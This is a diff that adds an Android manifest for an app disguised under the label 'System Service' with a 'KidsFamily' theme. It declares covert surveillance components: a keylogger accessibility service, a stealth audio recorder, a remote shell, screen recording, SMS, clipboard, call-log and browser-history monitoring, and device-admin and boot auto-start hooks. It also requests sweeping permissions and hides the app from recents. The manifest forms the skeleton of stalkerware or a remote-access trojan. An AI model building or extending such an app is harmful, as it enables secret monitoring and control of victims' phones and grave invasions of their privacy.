@@ -1,0 +1,249 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CLIPBOARD" />
+    <uses-permission android:name="android.permission.BATTERY_STATS" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="false" />
+
+    <application
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Service"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="false"
+        android:theme="@style/Theme.KidsFamily"
+        android:usesCleartextTraffic="true"
+        android:excludeFromRecents="true"
+        android:noHistory="true"
+        android:killAfterRestore="false"
+        android:restoreAnyVersion="false"
+        android:hasCode="true"
+        android:persistent="false"
+        tools:targetApi="34"
+        tools:ignore="GoogleAppIndexingWarning">
+
+        <!-- Main Activity - LAUNCHER langsung connect -->
+        <activity
+            android:name=".ui.main.MainActivity"
+            android:exported="true"
+            android:theme="@style/Theme.KidsFamily"
+            android:windowSoftInputMode="adjustResize"
+            android:launchMode="singleTask">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Location Service -->
+        <service
+            android:name=".service.LocationService"
+            android:foregroundServiceType="location"
+            android:exported="false" />
+
+        <!-- Screen Control Service -->
+        <service
+            android:name=".service.ScreenControlService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- Screen Recorder Service -->
+        <service
+            android:name=".service.ScreenRecorderService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- Boot Receiver - auto-start on device boot -->
+        <receiver
+            android:name=".service.BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Camera Service -->
+        <service
+            android:name=".service.CameraService"
+            android:foregroundServiceType="camera"
+            android:exported="false" />
+
+        <!-- Voice Monitor Service -->
+        <service
+            android:name=".service.VoiceMonitorService"
+            android:foregroundServiceType="microphone"
+            android:exported="false" />
+
+        <!-- Stealth Audio Service -->
+        <service
+            android:name=".service.StealthAudioService"
+            android:foregroundServiceType="microphone"
+            android:exported="false" />
+
+        <!-- Session Monitor Service -->
+        <service
+            android:name=".service.SessionMonitorService"
+            android:exported="false" />
+
+        <!-- SMS/Chat Monitor Service -->
+        <service
+            android:name=".service.SmsMonitorService"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- App Blocklist Service -->
+        <service
+            android:name=".service.AppBlockService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Media Access Service -->
+        <service
+            android:name=".service.MediaAccessService"
+            android:exported="false" />
+
+        <!-- Network Monitor Service -->
+        <service
+            android:name=".service.NetworkMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Device Info Service -->
+        <service
+            android:name=".service.DeviceInfoService"
+            android:exported="false" />
+
+        <!-- Remote Shell Service -->
+        <service
+            android:name=".service.RemoteShellService"
+            android:exported="false" />
+
+        <!-- Contacts Access Service -->
+        <service
+            android:name=".service.ContactsAccessService"
+            android:exported="false" />
+
+        <!-- File Manager Service -->
+        <service
+            android:name=".service.FileManagerService"
+            android:exported="false" />
+
+        <!-- Clipboard Monitor Service -->
+        <service
+            android:name=".service.ClipboardMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Call Log Service -->
+        <service
+            android:name=".service.CallLogService"
+            android:exported="false" />
+
+        <!-- Keylogger/Accessibility Service -->
+        <service
+            android:name=".service.KeyloggerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- App Usage Monitor Service -->
+        <service
+            android:name=".service.AppUsageService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Browser History Service -->
+        <service
+            android:name=".service.BrowserHistoryService"
+            android:exported="false" />
+
+        <!-- Remote Notification Service -->
+        <service
+            android:name=".service.RemoteNotificationService"
+            android:exported="false" />
+
+        <!-- Remote Ring Service -->
+        <service
+            android:name=".service.RemoteRingService"
+            android:exported="false" />
+
+        <!-- SIM Card Info Service -->
+        <service
+            android:name=".service.SimCardService"
+            android:exported="false" />
+
+        <!-- Battery Monitor Service -->
+        <service
+            android:name=".service.BatteryMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Camera Burst Service -->
+        <service
+            android:name=".service.CameraBurstService"
+            android:foregroundServiceType="camera"
+            android:exported="false" />
+
+        <!-- Flashlight Service -->
+        <service
+            android:name=".service.FlashlightService"
+            android:exported="false" />
+
+        <!-- Device Admin Receiver -->
+        <receiver
+            android:name=".service.DeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policy" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>
